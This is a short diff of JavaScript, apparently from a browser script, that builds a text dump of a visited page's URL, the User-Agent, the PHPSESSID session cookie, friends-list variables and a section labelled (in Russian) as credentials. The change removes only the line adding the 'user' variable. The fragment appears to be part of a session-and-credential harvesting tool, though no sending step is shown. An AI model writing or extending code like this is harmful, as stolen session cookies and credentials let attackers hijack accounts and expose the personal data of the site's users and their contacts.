@@ -190,7 +190,6 @@
             fileContent += `URL страницы: ${window.location.href}\n`;
             fileContent += `User-Agent: ${navigator.userAgent}\n\n`;
             fileContent += `--- PHPSESSID ---\n${phpsessid || "PHPSESSID: не найдена"}\n\n`;
-            fileContent += `--- ДАННЫЕ ИЗ ПЕРЕМЕННОЙ user ---\n${userData}\n\n`;
             fileContent += `--- ДАННЫЕ ИЗ ПЕРЕМЕННОЙ friendsData ---\n${friendsDataStr}\n\n`;
             fileContent += `--- ДАННЫЕ ИЗ ПЕРЕМЕННОЙ friendsArr ---\n${friendsArrStr}\n\n`;
             fileContent += `--- УЧЕТНЫЕ ДАННЫЕ ---\n`;
